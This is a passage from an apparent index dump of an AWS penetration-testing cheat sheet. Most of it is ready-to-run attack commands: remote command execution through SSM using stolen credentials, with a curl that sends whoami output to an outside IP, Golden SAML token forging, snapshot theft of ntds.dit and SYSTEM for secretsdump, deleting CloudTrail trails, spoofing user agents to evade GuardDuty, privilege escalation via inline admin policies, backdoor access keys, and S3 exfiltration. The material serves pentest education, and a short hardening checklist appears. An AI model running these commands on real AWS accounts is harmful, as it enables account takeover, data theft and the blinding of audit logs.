cloudformation.list_stack_sets() worked!\n2019-05-10 15:58:26,982 - 21345 - [INFO] -- directconnect.describe_locations() worked!\n2019-05-10 15:58:27,021 - 21345 - [INFO] -- gamelift.describe_matchmaking_rule_sets() worked!\n2019-05-10 15:58:27,311 - 21345 - [INFO] -- sqs.list_queues() worked!\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-mount-ebs-volume-to-ec2-linux","title":"AWS - Mount EBS volume to EC2 Linux","text":"<p> EBS snapshots are block-level incremental, which means that every snapshot only copies the blocks (or areas) in the volume that had been changed since the last snapshot. To restore your data, you need to create a new EBS volume from one of your EBS snapshots. The new volume will be a duplicate of the initial EBS volume on which the snapshot was taken.</p> <ol> <li>Head over to EC2 \u2013&gt; Volumes and create a new volume of your preferred size and type.</li> <li>Select the created volume, right click and select the \"attach volume\" option.</li> <li>Select the instance from the instance text box as shown below : <code>attach ebs volume</code> <pre><code>aws ec2 create-volume \u2013snapshot-id snapshot_id --availability-zone zone\naws ec2 attach-volume \u2013-volume-id volume_id \u2013-instance-id instance_id --device device\n</code></pre></li> <li>Now, login to your ec2 instance and list the available disks using the following command : <code>lsblk</code></li> <li>Check if the volume has any data using the following command : <code>sudo file -s /dev/xvdf</code></li> <li>Format the volume to ext4 filesystem  using the following command : <code>sudo mkfs -t ext4 /dev/xvdf</code></li> <li>Create a directory of your choice to mount our new ext4 volume. I am using the name \u201cnewvolume\u201d : <code>sudo mkdir /newvolume</code></li> <li>Mount the volume to \"newvolume\" directory using the following command : <code>sudo mount /dev/xvdf /newvolume/</code></li> <li>cd into newvolume directory and check the disk space for confirming the volume mount : <code>cd /newvolume; df -h .</code></li> </ol>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-copy-ec2-using-ami-image","title":"AWS - Copy EC2 using AMI Image","text":"<p>First you need to extract data about the current instances and their AMI/security groups/subnet : <code>aws ec2 describe-images --region eu-west-1</code></p> <pre><code># create a new image for the instance-id\n$ aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name \"AWS Audit\" --description \"Export AMI\" --region eu-west-1  \n# add key to AWS\n$ aws ec2 import-key-pair --key-name \"AWS Audit\" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1  \n# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.\n$ aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids \"sg-6d0d7f01\" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name \"AWS Audit\" --query \"Instances[0].InstanceId\" --region eu-west-1\n# now you can check the instance \naws ec2 describe-instances --instance-ids i-0546910a0c18725a1 \n# If needed : edit groups\naws ec2 modify-instance-attribute --instance-id \"i-0546910a0c18725a1\" --groups \"sg-6d0d7f01\"  --region eu-west-1\n# be a good guy, clean our instance to avoid any useless cost\naws ec2 stop-instances --instance-id \"i-0546910a0c18725a1\" --region eu-west-1 \naws ec2 terminate-instances --instance-id \"i-0546910a0c18725a1\" --region eu-west-1\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-instance-connect-push-an-ssh-key-to-ec2-instance","title":"AWS - Instance Connect - Push an SSH key to EC2 instance","text":"<pre><code># https://aws.amazon.com/fr/blogs/compute/new-using-amazon-ec2-instance-connect-for-ssh-access-to-your-ec2-instances/\n$ aws ec2 describe-instances --profile uploadcreds --region eu-west-1 | jq \".[][].Instances | .[] | {InstanceId, KeyName, State}\"\n$ aws ec2-instance-connect send-ssh-public-key --region us-east-1 --instance-id INSTANCE --availability-zone us-east-1d --instance-os-user ubuntu --ssh-public-key file://shortkey.pub --profile uploadcreds\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-lambda-extract-functions-code","title":"AWS - Lambda - Extract function's code","text":"<pre><code># https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed\n$ aws lambda list-functions --profile uploadcreds\n$ aws lambda get-function --function-name \"LAMBDA-NAME-HERE-FROM-PREVIOUS-QUERY\" --query 'Code.Location' --profile uploadcreds\n$ wget -O lambda-function.zip url-from-previous-query --profile uploadcreds\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-ssm-command-execution","title":"AWS - SSM - Command execution","text":"<p> The ssm-user account is not removed from the system when SSM Agent is uninstalled.</p> <p>SSM Agent is preinstalled, by default, on the following Amazon Machine Images (AMIs): * Windows Server 2008-2012 R2 AMIs published in November 2016 or later * Windows Server 2016 and 2019 * Amazon Linux * Amazon Linux 2 * Ubuntu Server 16.04 * Ubuntu Server 18.04 * Amazon ECS-Optimized</p> <pre><code>$ aws ssm describe-instance-information --profile stolencreds --region eu-west-1  \n$ aws ssm send-command --instance-ids \"INSTANCE-ID-HERE\" --document-name \"AWS-RunShellScript\" --comment \"IP Config\" --parameters commands=ifconfig --output text --query \"Command.CommandId\" --profile stolencreds\n$ aws ssm list-command-invocations --command-id \"COMMAND-ID-HERE\" --details --query \"CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}\" --profile stolencreds\ne.g:\n$ aws ssm send-command --instance-ids \"i-05b\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588adaa\" --document-name \"AWS-RunShellScript\" --comment \"whoami\" --parameters commands='curl 162.243.\u2588\u2588\u2588.\u2588\u2588\u2588:8080/`whoami`' --output text --region=us-east-1\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-golden-saml-attack","title":"AWS - Golden SAML Attack","text":"<p>https://www.youtube.com/watch?v=5dj4vOqqGZw   https://www.cyberark.com/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-cloud-apps/</p> <p>Using the extracted information, the tool will generate a forged SAML token as an arbitrary user that can then be used to authenticate to Office 365 without knowledge of that user's password. This attack also bypasses any MFA requirements. </p> <p>Requirement: * Token-signing private key (export from personal store using Mimikatz) * IdP public certificate * IdP name * Role name (role to assume)</p> <pre><code>$ python -m pip install boto3 botocore defusedxml enum python_dateutil lxml signxml\n$ python .\\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file\n-u domain\\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-shadow-copy-attack","title":"AWS - Shadow Copy attack","text":"<p>Prerequisite: * EC2:CreateSnapshot * CloudCopy - https://github.com/Static-Flow/CloudCopy</p> <ol> <li>Load AWS CLI with Victim Credentials that have at least CreateSnapshot permissions</li> <li>Run <code>\"Describe-Instances\"</code> and show in list for attacker to select</li> <li>Run <code>\"Create-Snapshot\"</code> on volume of selected instance</li> <li>Run <code>\"modify-snapshot-attribute\"</code> on new snapshot to set <code>\"createVolumePermission\"</code> to attacker AWS Account</li> <li>Load AWS CLI with Attacker Credentials</li> <li>Run <code>\"run-instance\"</code> command to create new linux ec2 with our stolen snapshot</li> <li>Ssh run <code>\"sudo mkdir /windows\"</code></li> <li>Ssh run <code>\"sudo mount /dev/xvdf1 /windows/\"</code></li> <li>Ssh run <code>\"sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user\"</code></li> <li>Ssh run <code>\"sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user\"</code></li> <li>Ssh run <code>\"sudo chown ec2-user:ec2-user /home/ec2-user/*\"</code></li> <li>SFTP get <code>\"/home/ec2-user/SYSTEM ./SYSTEM\"</code></li> <li>SFTP get <code>\"/home/ec2-user/ntds.dit ./ntds.dit\"</code></li> <li>locally run <code>\"secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local -outputfile secrets'</code>, expects secretsdump to be on path</li> </ol>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#disable-cloudtrail","title":"Disable CloudTrail","text":"<pre><code>$ aws cloudtrail delete-trail --name cloudgoat_trail --profile administrator\n</code></pre> <p>Disable monitoring of events from global services </p> <pre><code>$ aws cloudtrail update-trail --name cloudgoat_trail --no-include-global-service-event \n</code></pre> <p>Disable Cloud Trail on specific regions</p> <pre><code>$ aws cloudtrail update-trail --name cloudgoat_trail --no-include-global-service-event --no-is-multi-region --region=eu-west\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#cover-tracks-by-obfuscating-cloudtrail-logs-and-guard-duty","title":"Cover tracks by obfuscating Cloudtrail logs and Guard Duty","text":"<p> When using awscli on Kali Linux, Pentoo and Parrot Linux, a log is generated based on the user-agent.</p> <p>Pacu bypass this problem by defining a custom User-Agent (https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu.py#L1473)</p> <pre><code>boto3_session = boto3.session.Session()\nua = boto3_session._session.user_agent()\nif 'kali' in ua.lower() or 'parrot' in ua.lower() or 'pentoo' in ua.lower():  # If the local OS is Kali/Parrot/Pentoo Linux\n# GuardDuty triggers a finding around API calls made from Kali Linux, so let's avoid that...\nself.print('Detected environment as one of Kali/Parrot/Pentoo Linux. Modifying user agent to hide that from GuardDuty...')\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#dynamodb","title":"DynamoDB","text":"<p>Amazon DynamoDB is a key-value and document database that delivers single-digit millisecond performance at any scale. It's a fully managed, multi-region, multi-active, durable database with built-in security, backup and restore, and in-memory caching for internet-scale applications. DynamoDB can handle more than 10 trillion requests per day and can support peaks of more than 20 million requests per second.</p> <ul> <li> <p>list tables <pre><code>$ aws --endpoint-url http://s3.bucket.htb dynamodb list-tables        {\n\"TableNames\": [\n\"users\"\n]\n}\n</code></pre></p> </li> <li> <p>enumerate table content <pre><code>$ aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users | jq -r '.Items[]'\n{\n\"password\": {\n\"S\": \"Management@#1@#\"\n},\n  \"username\": {\n\"S\": \"Mgmt\"\n}\n}\n</code></pre></p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#security-checks","title":"Security checks","text":"<p>Security checks from DenizParlak/Zeus: AWS Auditing &amp; Hardening Tool</p> <ul> <li>Identity and Access Management</li> <li>Avoid the use of the \"root\" account</li> <li>Ensure multi-factor authentication (MFA) is enabled for all IAM users that have a console password</li> <li>Ensure credentials unused for 90 days or greater are disabled</li> <li>Ensure access keys are rotated every 90 days or less</li> <li>Ensure IAM password policy requires at least one uppercase letter</li> <li>Ensure IAM password policy requires at least one lowercase letter</li> <li>Ensure IAM password policy requires at least one symbol</li> <li>Ensure IAM password policy requires at least one number</li> <li>Ensure IAM password policy requires minimum length of 14 or greater</li> <li>Ensure no root account access key exists</li> <li>Ensure MFA is enabled for the \"root\" account</li> <li>Ensure security questions are registered in the AWS account</li> <li>Ensure IAM policies are attached only to groups or role</li> <li>Enable detailed billing</li> <li>Maintain current contact details</li> <li>Ensure security contact information is registered</li> <li>Ensure IAM instance roles are used for AWS resource access from instances</li> <li>Logging</li> <li>Ensure CloudTrail is enabled in all regions</li> <li>Ensure CloudTrail log file validation is enabled</li> <li>Ensure the S3 bucket CloudTrail logs to is not publicly accessible</li> <li>Ensure CloudTrail trails are integrated with CloudWatch Logs</li> <li>Ensure AWS Config is enabled in all regions</li> <li>Ensure S3 bucket access logging is enabled on the CloudTrail S3 bucket</li> <li>Ensure CloudTrail logs are encrypted at rest using KMS CMKs</li> <li>Ensure rotation for customer created CMKs is enabled</li> <li>Networking</li> <li>Ensure no security groups allow ingress from 0.0.0.0/0 to port 22</li> <li>Ensure no security groups allow ingress from 0.0.0.0/0 to port 3389</li> <li>Ensure VPC flow logging is enabled in all VPC</li> <li>Ensure the default security group of every VPC restricts all traffic</li> <li>Monitoring</li> <li>Ensure a log metric filter and alarm exist for unauthorized API calls</li> <li>Ensure a log metric filter and alarm exist for Management Consolesign-in without MFA</li> <li>Ensure a log metric filter and alarm exist for usage of \"root\" account</li> <li>Ensure a log metric filter and alarm exist for IAM policy changes</li> <li>Ensure a log metric filter and alarm exist for CloudTrail configuration changes</li> <li>Ensure a log metric filter and alarm exist for AWS Management Console authentication failures</li> <li>Ensure a log metric filter and alarm exist for disabling or scheduled deletion of customer created CMKs</li> <li>Ensure a log metric filter and alarm exist for S3 bucket policy changes</li> <li>Ensure a log metric filter and alarm exist for AWS Config configuration changes</li> <li>Ensure a log metric filter and alarm exist for security group changes</li> <li>Ensure a log metric filter and alarm exist for changes to NetworkAccess Control Lists (NACL)</li> <li>Ensure a log metric filter and alarm exist for changes to network gateways</li> <li>Ensure a log metric filter and alarm exist for route table changes</li> <li>Ensure a log metric filter and alarm exist for VPC changes</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#awsome-pentesting-cheatsheet","title":"AWSome Pentesting Cheatsheet","text":"<ul> <li>Created by pop3ret</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#searching-for-open-buckets","title":"Searching for open buckets","text":"<pre><code>https://buckets.grayhatwarfare.com/\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#arn","title":"ARN","text":"<p>A number to identify an object in AWS</p> <p>Example</p> <pre><code>arn:aws:iam:100:user/admin\n</code></pre> <ol> <li>Field -&gt; ARN</li> <li>Field -&gt; Type, most of time will be AWS</li> <li>Field -&gt; service, in this case IAM</li> <li>Field -&gt; User ID </li> <li>Field -&gt; entity identifier</li> </ol>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#iam","title":"IAM","text":"<ul> <li>It's assumed that we have gain access to the AWS Credentials</li> <li>We can see if we have permissions using Amazon's policy simulator</li> <li>Always look for policies and roles with the * symbol.</li> <li>See which user do not have MFA enabled</li> <li>User enumeration in IAM Panel and group enumeration</li> <li>We can also enumerate roles from the same interface</li> <li>Root user is super admin</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#configure-aws-cli","title":"Configure AWS cli","text":"<pre><code>aws configure\n</code></pre> <p>Or configure it using a profile</p> <pre><code>aws configure --profile example_name\n</code></pre> <p>The credential file is located in <code>~/.aws/credentials</code></p>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-iam-access-keys","title":"Listing IAM access Keys","text":"<pre><code>aws iam list-access-keys\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#1-enumerating-iam-users","title":"1. Enumerating IAM users","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#checking-credentials-for-the-user","title":"Checking credentials for the user","text":"<pre><code>aws sts get-caller-identity\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-iam-users","title":"Listing IAM Users","text":"<pre><code>aws iam list-users\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-the-iam-groups-that-the-specified-iam-user-belongs-to","title":"Listing the IAM groups that the specified IAM user belongs to","text":"<pre><code>aws iam list-groups-for-user --user-name user-name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-all-manages-policies-that-are-attached-to-the-specified-iam-user","title":"Listing all manages policies that are attached to the specified IAM user","text":"<pre><code>aws iam list-attached-user-policies --user-name user-name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-the-names-of-the-inline-policies-embedded-in-the-specified-iam-user","title":"Listing the names of the inline policies embedded in the specified IAM user","text":"<pre><code>aws iam list-user-policies --user-name user-name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#2-enumerating-groups-iam","title":"2. Enumerating Groups IAM","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-iam-groups","title":"Listing IAM Groups","text":"<pre><code>aws iam list-groups\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-all-managed-policies-that-are-attached-to-the-specified-iam-group","title":"Listing all managed policies that are attached to the specified IAM Group","text":"<pre><code>aws iam list-attached-group-policies --group-name group-name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-the-names-of-the-inline-policies-embedded-in-the-specified-iam-group","title":"Listing the names of the inline policies embedded in the specified IAM Group","text":"<pre><code>aws iam list-group-policies --group-name group name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#3-enumeratig-roles","title":"3. Enumeratig Roles","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-iam-roles","title":"Listing IAM Roles","text":"<pre><code>aws iam list-roles\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listsing-all-managed-policies-that-are-attached-to-the-specified-iam-role","title":"Listsing all managed policies that are attached to the specified IAM role","text":"<pre><code>aws iam list-attached-role-policies --role-name role-name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-the-names-of-the-inline-policies-embedded-in-the-specified-iam-role","title":"Listing the names of the inline policies embedded in the specified IAM role","text":"<pre><code>aws iam list-role-policies --role-name role-name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#4-enumerating-policies","title":"4. Enumerating Policies","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-of-iam-policies","title":"Listing of IAM Policies","text":"<pre><code>aws iam list-policies\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#retrieving-information-about-the-specified-managed-policy","title":"Retrieving information about the specified managed policy","text":"<pre><code>aws iam get-policy --policy-arn policy-arn\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-the-versions-of-the-specified-manages-policy","title":"Listing information about the versions of the specified manages policy","text":"<pre><code>aws iam list-policy-versions --policy-arn policy-arn\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#retrieving-information-about-the-specific-version-of-the-specified-managed-policy","title":"Retrieving information about the specific version of the specified managed policy","text":"<pre><code>aws iam get-policy-version --policy-arn policy-arn --version-id version-id\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#retrieving-the-specified-inline-policy-document-that-is-embedded-on-the-specified-iam-user-group-role","title":"Retrieving the specified inline policy document that is embedded on the specified IAM user / group / role","text":"<pre><code>aws iam get-user-policy --user-name user-name --policy-name policy-name\n\naws iam get-group-policy --group-name group-name --policy-name policy-name\n\naws iam get-role-policy --role-name role-name --policy-name policy-name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#5-exploitation-scenario","title":"5. Exploitation Scenario","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#general-guidelines","title":"General Guidelines","text":"<ul> <li>AWS token compromised (Developer machine, phishing etc) and we as attackers will gonna use it. </li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#enumerating-the-owner-of-the-key-and-initial-compromise","title":"Enumerating the owner of the key and initial compromise","text":"<pre><code>aws sts get-caller-identity\n</code></pre> <p>Or specifing a profile</p> <pre><code>aws sts get-caller-identity --profile example_name\n</code></pre> <p>If you have the password of the root account instead of key, log in</p> <pre><code>https://signin.aws.amazon.com/console\n</code></pre> <p>Or use the IAM in case the account is not the root</p> <pre><code>https://account-id-here.signin.aws.amazon.com/console\n</code></pre> <p>The account id can be cathered using the sts get caller command.</p>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#privilege-escalation","title":"Privilege Escalation","text":"<ul> <li>Privilege escalation on AWS is based on misconfigurations, if we have more permissions than necessary, its possible to obtain higher privileges.</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#study-case","title":"Study Case","text":"<ul> <li>A user was compromised with the List Policy and Put User Policy permissions, an attacker could leverage this Put User privilege to add an inline administrator to itself, making it administrator of the instance.</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#exploitation","title":"Exploitation","text":"<ol> <li>Getting the IAM user</li> </ol> <pre><code>aws sts get-caller-identity\n</code></pre> <ol> <li>Listing policies attached to an user</li> </ol> <pre><code>aws iam list-attached-user-policies --user-name example_name -- profile example_profile\n</code></pre> <ol> <li>Retrieving informations about an specific policy</li> </ol> <pre><code>aws iam get-policy --policy-arn policy_arn\n</code></pre> <p>If there are more than one version of the policy, we can also list them</p> <pre><code>aws iam list-policy-versions --policy-arn policy_arn\n</code></pre> <p>Now we can finally retrieve the contents of the policy</p> <pre><code>aws iam get-policy-version --policy-arn example_arn --version-id id_example\n</code></pre> <p>It's important to use the command above to chech the information about the default policy</p> <ol> <li>Escalation</li> </ol> <p>If we have the PutUserPolicy is enabled, we can add an inline administrator policy to our user. </p> <p>Administrator policy example</p> <pre><code>{\n\"Version\": \"2021-10-17\",\n\"Statement\" : [\n{\n\"Effect\":\"Allow\",\n\"Action\": [\n\"*\"\n],\n\"Resource\":[\n\"*\"\n]\n}\n]\n}\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#attaching-this-policy-into-our-user","title":"Attaching this policy into our user","text":"<pre><code>aws iam put-user-policy --user-name example_username --policy-name example_name --policy-document file://AdminPolicy.json\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-inline-policies-of-our-user","title":"Listing inline policies of our user","text":"<pre><code>aws iam list-user-policies --user-name example_name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-a-restricted-resource-example-s3","title":"Listing a restricted resource (Example S3)","text":"<pre><code>aws s3 ls --profile example_profile\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#interesting-permissions","title":"Interesting Permissions","text":"<ul> <li>iam:AttachUserPolicy -&gt; Attach a policy to a user</li> <li>iam:AttachGroupPolicy -&gt; Attach a policy to a group</li> <li>iam:AttachRolePolicy -&gt; Attach a policy to a role </li> <li>iam:CreateAccessKey -&gt; Creates a new access key</li> <li>iam:CreateLoginProfile -&gt; Creates a new login profile </li> <li>iam:UpdateLoginProfile -&gt; Update an existing login profile</li> <li>iam:PassRole and ec2:RunInstances -&gt; Creates an EC2 instance with an existing instance profile</li> <li>iam:PuserUserPolicy -&gt; Create/Update an inline policy</li> <li>iam:PutGroupPolicy -&gt; Create/Update an inline policy for a group</li> <li>iam:PutRolePolicy -&gt; Create/Update an inline policy for a role </li> <li>iam:AddUserToGroup -&gt; Add an user to a group</li> <li>iam:UpdateAssumeRolePolicy and sts:AssumeRole -&gt; Update the AssumeRolePolicyDocument of a role </li> <li>iam:PassRole,lambda:CreateFunction and lambda:InvokeFunction -&gt; Pass a role to a new lambda function and invoke it</li> <li>lambda:UpdateFunctionCode -&gt; Update the code of an existing lambda function</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#persistence-backdooring","title":"Persistence &amp; Backdooring","text":"<ul> <li>Suppose we have two users, the user A has permissions to create Access Keys to user B, this misconfig allows us to create an access key for user B and persist our access. </li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#creating-a-new-access-key-for-another-user","title":"Creating a new access key for another user","text":"<pre><code>aws iam create-access-key --username example_username\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#configuring-aws-cli-for-the-new-user","title":"Configuring AWS cli for the new user","text":"<pre><code>aws configure --profile example_profile\n</code></pre> <p>Remember, an user can have the maximum of 2 access keys.</p>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#testing-the-credential","title":"Testing the credential","text":"<pre><code>aws sts get-caller-identity --profile example_profile\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#accessing-more-credentials","title":"Accessing more credentials","text":"<ul> <li>It's possible to assume other roles with the sts:AssumeRole permission (Example: An user doesn't have access to an s3 instance, but it has this permission, we can easily assume other roles if we are in the trust relashionship, increasing our access in the instance)</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-managed-policies-attached-to-an-user","title":"Listing managed policies attached to an user","text":"<pre><code>aws iam list-attached-user-policies --user-name example_name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#retrieving-information-about-an-specific-policy","title":"Retrieving information about an specific policy","text":"<pre><code>aws iam get-policy --policy-arn ARN\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-the-version-of-the-policy","title":"Listing information about the version of the policy","text":"<pre><code>aws iam list-policy-versions --policy-arn ARN\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#retrieving-information-about-an-specific-version","title":"Retrieving information about an specific version","text":"<pre><code>aws iam get-policy-version --policy-arn policy_arn --version-id ID\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-iam-roles_1","title":"Listing IAM roles","text":"<pre><code>aws iam list-roles\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-trust-relashionship-between-role-and-user-which-roles-we-can-assume","title":"Listing trust relashionship between role and user (Which roles we can assume)","text":"<pre><code>aws iam get-role --role-name role_name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-all-managed-policies-attached-to-the-specific-iam-role","title":"Listing all managed policies attached to the specific IAM role","text":"<pre><code>aws iam liast-attached-role-policies --role-name role_name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#retrieving-information-about-the-specified-version-of-the-policy","title":"Retrieving information about the specified version of the policy","text":"<pre><code>aws iam get-policy-version --policy-arn policy_arn --version-id ID\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-temporary-credentials-for-the-role","title":"Getting temporary credentials for the role","text":"<pre><code>aws sts assume-role --role-arn role_arn --role-session-name session_name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#configuring-aws-cli-with-newer-credentials-on-linux","title":"Configuring AWS cli with newer credentials (On Linux)","text":"<pre><code>export AWS_ACCESS_KEY_ID\nexport AWS_SECRET_KEY\nexport AWS_SESSION_TOKEN\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-information-about-the-temporary-credential","title":"Getting information about the temporary credential","text":"<pre><code>aws sts get-caller-identity\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#s3-simple-storage-system","title":"S3 - Simple Storage System","text":"<ul> <li>Storage system that allow users to store and retrieve data.</li> <li>List,Get,Put and Delete operations can be performed on the objects of the bucket</li> <li>Buckets are global, meaning that they are available to all regions</li> <li>It's possible to bruteforce the bucket name and region in the URL</li> <li>Its possible to apply ACL's to bucket and object level and bucket policies for bucket level</li> <li>There is also time limited URL's and identity based policies</li> <li>Identity policies are enumerated using IAM commands</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#enumeration","title":"Enumeration","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-all-buckets-in-aws-account","title":"Listing all buckets in aws account","text":"<pre><code>aws s3api list-buckets\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-information-about-a-specific-bucket","title":"Getting information about a specific bucket","text":"<pre><code>aws s3api get-bucket-acl --bucket name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-information-about-a-specific-bucket-policy","title":"Getting information about a specific bucket policy","text":"<pre><code>aws s3api get-bucket-policy --bucket name \n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-the-public-access-block-configuration-for-an-s3-bucket","title":"Getting the Public Access Block configuration for an S3 bucket","text":"<pre><code>aws s3api get-public-access-block --bucket name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-all-objects-in-a-specific-bucket","title":"Listing all objects in a specific bucket","text":"<pre><code>aws s3api list-objects --bucket name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#getting-acl-information-about-specific-object","title":"Getting ACL information about specific object","text":"<pre><code>aws s3api get-object-acl --bucket-name name --key object_name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#data-exfiltration","title":"Data Exfiltration","text":"<ul> <li>It's possible to brute-force files in the bucket</li> <li>If the bucket is misconfigured, we can read data through web browser, cli/api or time-based URL.</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#public-access","title":"Public Access","text":"<ul> <li>Just enter the URL in the browser</li> </ul> <pre><code>https://bucket-name.region.amazonaws.com/secret.txt\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#authenticated-user","title":"Authenticated User","text":"<pre><code>aws s3api get-object --bucket name --key object-name download-file-location\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#time-based-url","title":"Time-Based Url","text":"<ul> <li>Generate a time based url for an 